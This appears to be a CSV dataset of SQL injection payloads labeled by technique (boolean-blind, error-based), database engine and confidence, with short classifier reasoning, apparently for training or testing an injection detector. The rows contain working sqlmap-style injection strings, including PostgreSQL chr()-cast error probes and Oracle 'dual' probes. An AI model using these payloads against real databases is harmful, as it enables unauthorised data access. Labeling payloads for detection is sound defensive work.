id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
39144,"select * from users WHERE username = ""1\' ) ) and ( ( \'guxv\' = \'guxv"" or username = ""-9564",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39145,"select * from users WHERE username = ""1\' and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-2154%\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39146,"-5863"" and username = ""1 ) ) and ( ( 5139 = 5139",unknown,generic,0.50,Insufficient data to classify payload type,1
39147,"1\' or username = ""1 ) as nbno where 9816 = 9816 and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk",unknown,generic,0.50,Insufficient data to classify payload type,1
39148,-9987 ) ) ) or# ( ( ( 2114 = 2114,unknown,generic,0.50,Insufficient data to classify payload type,1
39149,"1\' ) ) ) and username = ""1\' ) ) and ( ( \'hbwk\' like \'hbwk",unknown,generic,0.50,Insufficient data to classify payload type,1
39150,"-5585\' and username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1 ) ) ) and ( ( ( 6395 = 6395",unknown,generic,0.50,Insufficient data to classify payload type,1
39151,"1\' ) ) and username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39152,"-5585\' and username = ""1\' and username = ""-1549\' ) or username = ""-9644 ) ) and ( ( 5616 = 5616",unknown,generic,0.50,Insufficient data to classify payload type,1
39153,"1"" and ""xyjg"" = ""xyjg"" or username = ""-1889%\' ) ) ) or ( ( 5299 = 5299",unknown,generic,0.50,Insufficient data to classify payload type,1
39154,-9987 ) ) ) or# ( ( ( 2114 = 2114,unknown,generic,0.50,Insufficient data to classify payload type,1
39155,"-9987 ) ) ) and username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39156,"-1985 ) ) ) and username = ""-7323%"" and ""%"" = """,unknown,generic,0.50,Insufficient data to classify payload type,1
39157,"-6036 ) ) ) or username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39158,"1\'+ ( select vohg where 6383 = 6383 and username = ""1%"" or username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39159,"1\'+ ( select vohg where 6383 = 6383 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\' ) ) ) and ( ( ( \'abcf\' like \'abcf",unknown,generic,0.50,Insufficient data to classify payload type,1
39160,"select * from users WHERE username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""1\' ) and ( \'ulkq\' = \'ulkq"" and username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-2756\' where 6156 = 6156",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39161,"SELECT * FROM users WHERE username = ""-1254"" AND username = ""-3899\' ) where 8152 = 8152",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39162,"select * from users WHERE username = ""-7199\' or \'qibr\' = \'qibr"" and username = ""-5062 ) where 7457 = 7457",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39163,"1\' or username = ""-6353%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39164,"1%\' and username = ""1"" and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
